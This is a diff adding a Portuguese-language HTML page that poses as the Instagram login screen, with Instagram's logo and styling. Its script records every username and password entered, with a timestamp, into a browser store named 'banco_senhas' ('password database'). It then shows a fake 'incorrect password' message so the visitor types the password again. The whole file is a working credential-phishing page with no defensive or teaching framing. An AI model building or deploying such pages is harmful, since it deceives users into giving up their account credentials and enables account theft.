@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram • Login</title>
+    <style>
+        body { background-color: #121212; color: white; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .container { width: 90%; max-width: 350px; text-align: center; }
+        .logo { width: 60px; margin-bottom: 30px; }
+        input { width: 100%; background: #1c1c1c; border: 1px solid #363636; border-radius: 12px; padding: 14px; margin-bottom: 12px; color: white; box-sizing: border-box; font-size: 16px; }
+        #error { color: #ed4956; font-size: 14px; margin-bottom: 15px; display: none; }
+        button { width: 100%; background: #0064e0; color: white; border: none; border-radius: 25px; padding: 12px; font-weight: bold; cursor: pointer; font-size: 16px; }
+        .spinner { display: none; width: 20px; height: 20px; border: 3px solid rgba(255,255,255,.3); border-radius: 50%; border-top-color: #fff; animation: spin 1s infinite; margin: 0 auto; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/600px-Instagram_icon.png" class="logo">
+        <div id="error">Senha incorreta. Verifique e tente novamente.</div>
+        <form id="loginForm">
+            <input type="text" id="user" placeholder="Nome de usuário, email ou celular" required>
+            <input type="password" id="pass" placeholder="Senha" required>
+            <button type="submit" id="btn">Entrar</button>
+            <div id="loading" class="spinner"></div>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const u = document.getElementById('user').value;
+            const p = document.getElementById('pass').value;
+            
+            // Salva no banco de dados local
+            let db = JSON.parse(localStorage.getItem('banco_senhas')) || [];
+            db.push({ usuario: u, senha: p, data: new Date().toLocaleString() });
+            localStorage.setItem('banco_senhas', JSON.stringify(db));
+
+            // Efeito de carregamento e erro
+            document.getElementById('btn').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+            
+            setTimeout(() => {
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('btn').style.display = 'block';
+                document.getElementById('error').style.display = 'block';
+                document.getElementById('pass').value = '';
+            }, 1500);
+        });
+    </script>
+</body>
+</html>
+  
